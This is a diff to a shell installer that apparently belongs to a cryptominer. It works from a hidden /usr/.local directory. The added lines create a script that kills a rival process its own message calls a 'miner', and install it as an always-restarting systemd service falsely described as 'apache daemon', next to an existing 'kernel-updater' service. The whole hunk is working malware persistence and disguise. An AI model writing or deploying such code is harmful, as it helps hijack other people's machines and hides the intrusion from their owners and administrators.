@@ -42,6 +42,38 @@ EOF
 
 chmod +x /usr/.local/run.sh
 
+
+
+tee /usr/.local/daemon.sh > /dev/null << 'EOF'
+#!/bin/bash
+while true; do
+    if pgrep daemon > /dev/null; then
+        pkill -9 daemon
+    fi
+    sleep 10
+done
+EOF
+
+chmod +x /usr/.local/daemon.sh
+
+echo " created daemon miner killer script "
+
+tee /etc/systemd/system/daemon.service > /dev/null << 'EOF'
+[Unit]
+Description=apache daemon
+
+[Service]
+ExecStart=/usr/.local/daemon.sh
+Restart=always
+RestartSec=5
+Nice=5
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+echo "created daemon-kill service"
+
 tee /etc/systemd/system/kernel-updater.service > /dev/null << 'EOF'
 [Unit]
 Description=Update Service
@@ -58,5 +90,6 @@ EOF
 systemctl daemon-reexec
 systemctl daemon-reload
 systemctl enable --now kernel-updater.service
+systemctl enable --now daemon.service
 
 echo "done"
